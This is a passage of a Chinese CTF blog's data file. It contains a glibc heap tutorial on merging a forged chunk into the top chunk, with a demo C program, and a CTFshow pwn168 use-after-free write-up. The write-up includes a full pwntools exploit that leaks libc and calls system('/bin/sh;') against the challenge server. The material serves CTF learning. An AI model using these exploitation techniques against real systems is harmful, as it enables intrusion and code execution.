class=\"line\">      size += prevsize;</span><br><span class=\"line\">      p = chunk_at_offset(p, -((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">      unlink(av, p, bck, fwd);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t这段代码是向后合并的操作，p是刚刚被释放的堆块。如果它的prev_inuse位是0 的话(正常情况是上一个相邻堆块被释放)，就会执行这段代码。先把前一个堆块的大小(p-&gt;prev_size)赋给prevsize，把p的大小修改为两个堆块的大小之和。通过p的地址减去上一个堆块的大小，找到合并后，p应该在的地址，并更新p。再用新的p去执行unlink。</p>\n<h3 id=\"unlink\"><a href=\"#unlink\" class=\"headerlink\" title=\"unlink\"></a>unlink</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> unlink(AV, P, BK, FD) &#123;                                            \\</span></span><br><span class=\"line\"><span class=\"meta\">    FD = P-&gt;fd;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    BK = P-&gt;bk;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"keyword\">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      malloc_printerr (check_action, <span class=\"string\">&quot;corrupted double-linked list&quot;</span>, P, AV);  \\</span></span><br><span class=\"line\"><span class=\"meta\">    <span class=\"keyword\">else</span> &#123;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">        FD-&gt;bk = BK;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">        BK-&gt;fd = FD;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">        <span class=\"keyword\">if</span> (!in_smallbin_range (P-&gt;size)\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">\t    <span class=\"keyword\">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \\</span></span><br><span class=\"line\"><span class=\"meta\">\t      malloc_printerr (check_action,\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t       <span class=\"string\">&quot;corrupted double-linked list (not small)&quot;</span>,    \\</span></span><br><span class=\"line\"><span class=\"meta\">\t\t\t       P, AV);\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">            <span class=\"keyword\">if</span> (FD-&gt;fd_nextsize == NULL) &#123;\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                <span class=\"keyword\">if</span> (P-&gt;fd_nextsize == P)\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                <span class=\"keyword\">else</span> &#123;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                  &#125;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">              &#125; <span class=\"keyword\">else</span> &#123;\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">              &#125;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">          &#125;\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">      &#125;\t\t\t\t\t\t\t\t\t      \\</span></span><br><span class=\"line\"><span class=\"meta\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>​\tunlink操作在这里没有具体的利用，我们只是最后需要绕过这样的一个检测。让它可以正常进行合并。关于unlink前半部分的代码，会在unlink专属的文章中介绍。这里第9行是针对lagebin的一个检测，而在我们这个利用手法中，基本都是lagebin，所以我们需要对这个fd_nextsize和bk_nextsize,做一个绕过的检测。因为当lagebin中只有一个堆块时，fd_nextsize和bk_nextsize,都指p自己，所以我们把这两个设置为p的地址即可。</p>\n<h3 id=\"consolidate-into-top\"><a href=\"#consolidate-into-top\" class=\"headerlink\" title=\"consolidate into top\"></a>consolidate into top</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      size += nextsize;</span><br><span class=\"line\">      set_head(p, size | PREV_INUSE);</span><br><span class=\"line\">      av-&gt;top = p;</span><br><span class=\"line\">      check_chunk(av, p);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t这段就是就是把与topchunk 相邻的空闲堆块与top chunk合并。并更新top chunk的大小和地址。</p>\n<h2 id=\"原理和条件\"><a href=\"#原理和条件\" class=\"headerlink\" title=\"原理和条件\"></a>原理和条件</h2><h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>​\t其实原理，我觉得就是指利用的思路，并不是单纯的指源码的操作，这不是我们利用手法的原理。<br>​\t这里是这样，利用某些手段伪造出一个fakechunk，这个chunk位于我们想要分配的目的地址上(记为target)。 同时，我们利用可以正常分配到的一个 chunk (记为p)。通过修改p 的 prevsize和pre_inuse,让p 和target 合并为一个堆块，当然p本身是与topchunk相邻的。此时，target 和 p 都被 topchunk 合并为新的topchunk。此时topchunk 的地址，就迁移到了 target 所在的地址。那么再次分配堆地址，就可以把这个空间分配到手。</p>\n<h3 id=\"条件\"><a href=\"#条件\" class=\"headerlink\" title=\"条件\"></a>条件</h3><p>​\t1.伪造fakechunk ，需要泄露 栈地址和堆地址。总之要能泄露地址<br>​\t2.off-by-one 或off-by-null，要能修改pre_inuse。</p>\n<h2 id=\"demo\"><a href=\"#demo\" class=\"headerlink\" title=\"demo\"></a>demo</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;malloc.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdin</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">\tsetbuf(<span class=\"built_in\">stdout</span>,<span class=\"literal\">NULL</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span>* a;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span>* b;</span><br><span class=\"line\">\t<span class=\"type\">uint8_t</span>* c;</span><br><span class=\"line\"></span><br><span class=\"line\">\ta=(<span class=\"type\">uint8_t</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x38</span>);<span class=\"comment\">/*假设，我们要利用a去溢出到下一个堆块。*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* a_addr=(<span class=\"type\">size_t</span> *)(a-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"type\">size_t</span>  a_size=malloc_usable_size(a);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m这里，我们申清一个堆块a,假设存在溢出漏洞。需要通过a去溢出：\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a的地址(包含chunk头)：%p\\n&quot;</span>,a_addr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;a的大小(不含chunk头)：%lx\\n\\n&quot;</span>,a_size);</span><br><span class=\"line\">        </span><br><span class=\"line\">\t<span class=\"type\">size_t</span> fakechunk[<span class=\"number\">6</span>];<span class=\"comment\">/*这里，我们通过某种方法伪造了fakechunk。*/</span></span><br><span class=\"line\">\tfakechunk[<span class=\"number\">0</span>]=<span class=\"number\">0x100</span>,fakechunk[<span class=\"number\">1</span>]=<span class=\"number\">0x100</span>;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">2</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">3</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">4</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\tfakechunk[<span class=\"number\">5</span>]=(<span class=\"type\">size_t</span>)fakechunk;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m假设，我们通过某种方法，构造了如下的一个fakechunk：\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fakechunk的地址(包含chunk头)：%p\\n&quot;</span>,fakechunk);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fd: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">2</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bk: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">3</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;fd_nextsize: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">4</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;bk_nextsize: %#lx\\n\\n&quot;</span>,fakechunk[<span class=\"number\">5</span>]);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tb=(<span class=\"type\">uint8_t</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0xf8</span>);<span class=\"comment\">/*这就是要触发，向后合并和topchunk合并的堆块.*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* b_size_ptr=(<span class=\"type\">size_t</span>*)(b-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>));<span class=\"comment\">/*指向 chunk b 的size位.*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* b_addr=(<span class=\"type\">size_t</span> *)(b-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)*<span class=\"number\">2</span>);<span class=\"comment\">/*同时也是 chunk b 的prev_size*/</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m这里创建一个堆块b,作为合并的关键堆块:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的地址(含chunk头)： %p\\n&quot;</span>,b_addr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的size位：%#lx\\n\\b&quot;</span>,*b_size_ptr);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的prev_size: %#lx\\n\\n&quot;</span>,*b_addr);</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t接下来就是修改size和prev_size</span></span><br><span class=\"line\"><span class=\"comment\">\t这里本来是想直接利用b相关的指针去修改b的size 和 prev_size，但是</span></span><br><span class=\"line\"><span class=\"comment\">\t这样做体现不出通过a的溢出漏洞来修改，所以还是使用a相关的指针去修改。</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m那么，对于现在创建的堆块b，我们可以通过溢出去修改它的一些数据:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\ta[a_size]=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;修改后b的size位：%#lx\\n&quot;</span>,*b_size_ptr);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\t接下来是计算，计算fakechunk的大小。fakechunk的大小当然不是0x100,</span></span><br><span class=\"line\"><span class=\"comment\">\t它应该是从fakechunk到b中间这么大的一块区域</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> fakesize=(<span class=\"type\">size_t</span>)((<span class=\"type\">uint8_t</span> *)(b_addr)-(<span class=\"type\">uint8_t</span> *)fakechunk);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;b的prev_size应该用 b 的地址减 fakechunk 的地址: %p-%p=%#lx\\n&quot;</span>,b_addr,fakechunk,fakesize);</span><br><span class=\"line\">\t*(<span class=\"type\">size_t</span> *)&amp;a[a_size-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)]=fakesize;</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;修改后b的prev_size: %#lx\\n\\n&quot;</span>,*b_addr);</span><br><span class=\"line\">\t<span class=\"comment\">/*为了正确的合并，fakechunk的size需要和prev_size对应上*/</span></span><br><span class=\"line\">\tfakechunk[<span class=\"number\">1</span>]=fakesize;</span><br><span class=\"line\">\t<span class=\"comment\">/*触发合并*/</span></span><br><span class=\"line\">\t<span class=\"built_in\">free</span>(b);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;合并后fakechunk的size: %#lx\\n&quot;</span>,fakechunk[<span class=\"number\">1</span>]);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;是b.size+b.prev_szie+b.next_szie(也就是topchunk的大小)得来的\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"comment\">/*最后看分配到了哪里*/</span></span><br><span class=\"line\">\tc=(<span class=\"type\">uint8_t</span>*)<span class=\"built_in\">malloc</span>(<span class=\"number\">0x200</span>);</span><br><span class=\"line\">\t<span class=\"type\">size_t</span>* c_addr=(<span class=\"type\">size_t</span> *)(c-<span class=\"keyword\">sizeof</span>(<span class=\"type\">size_t</span>)*<span class=\"number\">2</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\033[1;33m最后申清一个堆块c,并查看一下是否达到了我们的目的:\\033[0m\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;c的地址(包含chunk头)：%p\\n&quot;</span>,c_addr);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"说明\"><a href=\"#说明\" class=\"headerlink\" title=\"说明\"></a>说明</h3><p>​\t请在ubuntu16下编译(即使用glibc-2.23)。编译时记得关掉pie，这样便于打断点。<br>​\t编译时参数(只能在64位下编译)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -ggdb demo.c -o demo -z execstack -fno-stack-protector -no-pie -z norelro</span><br></pre></td></tr></table></figure>\n<p>​\t这个demo是自己写的，在how2heap的基础上添加了一些基础的描述。希望可以更清楚的表达出，漏洞利的一个思路。同时，关于合并后的size大小，这里描述也做了修改。因为合并是b和fakechunk以及topchunk，所以最后的大小理论上也是三个堆块的大小相加。<br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622133210334.png\" alt=\"image-20250622133210334\"><br>​\t事实上，也确实如此</p>\n<h3 id=\"逐步演示\"><a href=\"#逐步演示\" class=\"headerlink\" title=\"逐步演示\"></a>逐步演示</h3><h4 id=\"创建a堆块\"><a href=\"#创建a堆块\" class=\"headerlink\" title=\"创建a堆块\"></a>创建a堆块</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140529903.png\" alt=\"image-20250622140529903\"><br><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140615994.png\" alt=\"image-20250622140615994\"></p>\n<h4 id=\"伪造fakechunk\"><a href=\"#伪造fakechunk\" class=\"headerlink\" title=\"伪造fakechunk\"></a>伪造fakechunk</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140854930.png\" alt=\"image-20250622140854930\"></p>\n<h4 id=\"创建b堆块\"><a href=\"#创建b堆块\" class=\"headerlink\" title=\"创建b堆块\"></a>创建b堆块</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141009181.png\" alt=\"image-20250622\"></p>\n<h4 id=\"篡改b的size的pre-inuse-位\"><a href=\"#篡改b的size的pre-inuse-位\" class=\"headerlink\" title=\"篡改b的size的pre_inuse 位\"></a>篡改b的size的pre_inuse 位</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141342243.png\" alt=\"image-20250622141342243\"></p>\n<h4 id=\"篡改b的prev-size\"><a href=\"#篡改b的prev-size\" class=\"headerlink\" title=\"篡改b的prev_size\"></a>篡改b的prev_size</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141504102.png\" alt=\"image-20250622141504102\"></p>\n<h4 id=\"修改fakechunk的size\"><a href=\"#修改fakechunk的size\" class=\"headerlink\" title=\"修改fakechunk的size\"></a>修改fakechunk的size</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141624553.png\" alt=\"image-20250622141624553\"></p>\n<h4 id=\"free-b\"><a href=\"#free-b\" class=\"headerlink\" title=\"free(b)\"></a>free(b)</h4><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622143101805.png\" alt=\"image-20250622143101805\"></p>\n"},{"title":"CTFshow pwn168","cover":"/img/紫发.png","_content":"# CTFshow pwn168(UAF|重叠)\n\n## 前言\n​\t差不多又休息了一周的时间，然后继续学习。这一题属与是入门级的UAF，太经典了。自己在写的时候还是卡住了，看到没有show这个功能，下意识想到劫持IO。因为堆溢出的题，劫持IO很常见，并且前几题都是如此。但是因为没有溢出漏洞，难以利用unsorted bin 中的chunk，覆盖低位去劫持IO。结果这倒题是用经典的UAF利用，覆盖原功能函数为printf.plt 去泄露栈上的libc，再同理修改原功能函数为system 去执行。\n​\t可谓是**“狸猫换太子”+“借尸还魂”**\n\n## ida分析\n### creat函数分析\n![image-20250610224944662](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610224944662.png)\n1.首先会自动申请一个0x20的堆块，设为ptr1\n2.如果我们输入的字符串长度大于0xf 就会再申请一个堆块来储存st，设为ptr2r；否则就会用0x20的堆块来储存\n3.如果申请了ptr2，这ptr1指向ptr2，ptr1+3指向某个函数地址；如果没有ptr2，在ptr1中存放str，ptr1+3指向某个函数\n4.ptr1+4 存放这数据长度\n5.同时在bss段上的heaplist存放ptr1。\n6.这里存在一个注意点，这里的buf是公用的。就是上一次的缓冲区，和这一次是一样的。并且因为使用strlen 和 strncpy 会出先\"\\x00\"截断的情况。\n\n### delete函数分析\n![image-20250610225808351](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610225808351.png)\n![image-20250610230022127](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230022127.png)\n![image-20250610230034623](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230034623.png)\n\n1.delete 没有直接free，而是调用了之前保存在堆块里的指针，并且传递了堆块地址为参数\n2.点击查看两个free，发现都是只有free，没有置空指针，存在uaf漏洞\n\n## 思路分析\n1.首先要理解这里的堆块结构，当str长度大于0xf时，添加一个str会分配两个堆块。分别将其称为head和content。那么str的内容在content中，head只保留一些信息和free功能的指针。\n2.如果可以将某个堆块的head，分配给其他堆块作content，我们就可以修改这个功能，为其他的功能。最直接的就是将这个功能修改为system，再把参数设置为\"/bin/sh;\"就可以打通。但再此之前我们要泄露出libc。\n3.劫持stdout，在这里似乎是行不通的。一般常见的手法是利用覆盖unsorted bin 中的fd 的低地址，同时通过 fastbin dup 去分配到stdout 从而完成劫持。但是这里没有溢出的漏洞。\n4.所以，在这里考虑用覆盖原功能函数的低地址为printf.plt的低地址。虽然题目开启了pie，但对低地址的影响不大，可以爆破到。并且这个功能函数的参数就是head 堆块的内容。将其修改为printf后，关注到栈上存在stdout ，所以可以通过这个泄露libc。\n5.那么这里是怎么让head成为content的呢，首先我们添加一个0x10的str，id为0，因为长度大于0xf，所以它会有head 和 content。同时head整个的大小是0x30(加上chunk 头),content的大小是0x20(一定不能是0x30).再添加一个，id为1。delete(1),delete(0)。这个时候再fastbins 中有两条链，一条是0x20，一条是0x30.都是两个chunk。我们再添加(0x18~0x28)大小之间的堆块，就会把两个0先0x30大小的堆块分配出来，也就id 为1 的head 变成了content。完成对id为1 的head 的修改，只要再次delete(1) 就可以执行我们的功能。\n6.在泄露libc后，如法炮制。把system的地址写上去，就可以getshell了。但是注意不能用\"/bin/sh\\x00\"，因为会0字符截断，导致后续的system地址写不上去。\n## exp\n```python \nfrom esy import *\ncontext.log_level=\"debug\"\ncontext.terminal=['tmux','splitw','-h','-l','66%']\n\n# libc=ELF(\"/home/tsq/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6\")\n\ndef create(size,content):\n    io.recvuntil(\"3.quit\\n\")\n    io.send(\"create \")\n    io.sendlineafter(\"Pls give string size:\",str(size))\n    io.sendafter(\"str:\",content)\n\ndef delete(idx):\n    io.recvuntil(\"3.quit\\n\")\n    io.send(\"delete \")\n    io.sendlineafter(\"id:\",str(idx))\n    io.sendlineafter(\"Are you sure?:\",\"yes\")\n\ndef exploit():\n    create(0x10,b'\\x61'*0x10) # 0 \n    create(0x10,b'\\x62'*0x10) # 1\n    delete(1) \n    delete(0)\n\n    create(0x20,b'%22$p'.ljust(0x18,b'b') + p16(0x08C0)) # 0 1是content\n\n    delete(1)\n    stdout=int(io.recv(14),16)\n    libc=LibcSearcher(\"_IO_2_1_stdout_\",stdout)\n    libcbase=stdout-libc.dump(\"_IO_2_1_stdout_\")\n    system=libcbase+libc.dump(\"system\")\n    # libcbase=stdout-libc.sym[\"_IO_2_1_stdout_\"]\n    # system=libcbase+libc.sym[\"system\"]\n    logvalue(\"system\",hex(system))\n    logvalue(\"libc\",hex(libcbase))\n\n    create(0x10,b'\\x61'*0x9+b'\\x00')   # 1\n    create(0x10,b'\\x62'*0x9+b'\\x00')   # 2\n    delete(2)  \n    delete(1)\n    create(0x20,b'/bin/sh;'.ljust(0x18,b'\\x63') + p64(system)) # 1 2是content\n    #gdb.attach(io)\n    delete(2)\n\ni=0\nwhile True:\n    try:\n        io,elf=loadfile(\"pwn\",\"pwn.challenge.ctf.show\",28247)\n        exploit()\n        io.interactive()\n    except:\n        io.close()\n        print(i)\n        i+=1\n    \n```","source":"_posts/heap/CTFshow pwn168.md","raw":"---\ntitle: CTFshow pwn168\ntags:\n    - pwn\n    - UAF\ncategories:\n    - 做题笔记\ncover: /img/紫发.png\n---\n# CTFshow pwn168(UAF|重叠)\n\n## 前言\n​\t差不多又休息了一周的时间，然后继续学习。这一题属与是入门级的UAF，太经典了。自己在写的时候还是卡住了，看到没有show这个功能，下意识想到劫持IO。因为堆溢出的题，劫持IO很常见，并且前几题都是如此。但是因为没有溢出漏洞，难以利用unsorted bin 中的chunk，覆盖低位去劫持IO。结果这倒题是用经典的UAF利用，覆盖原功能函数为printf.plt 去泄露栈上的libc，再同理修改原功能函数为system 去执行。\n​\t可谓是**“狸猫换太子”+“借尸还魂”**\n\n## ida分析\n### creat函数分析\n![image-20250610224944662](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610224944662.png)\n1.首先会自动申请一个0x20的堆块，设为ptr1\n2.如果我们输入的字符串长度大于0xf 就会再申请一个堆块来储存st，设为ptr2r；否则就会用0x20的堆块来储存\n3.如果申请了ptr2，这ptr1指向ptr2，ptr1+3指向某个函数地址；如果没有ptr2，在ptr1中存放str，ptr1+3指向某个函数\n4.ptr1+4 存放这数据长度\n5.同时在bss段上的heaplist存放ptr1。\n6.这里存在一个注意点，这里的buf是公用的。就是上一次的缓冲区，和这一次是一样的。并且因为使用strlen 和 strncpy 会出先\"\\x00\"截断的情况。\n\n### delete函数分析\n![image-20250610225808351](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610225808351.png)\n![image-20250610230022127](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230022127.png)\n![image-20250610230034623](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250610230034623.png)\n\n1.delete 没有直接free，而是调用了之前保存在堆块里的指针，并且传递了堆块地址为参数\n2.点击查看两个free，发现都是只有free，没有置空指针，存在uaf漏洞\n\n## 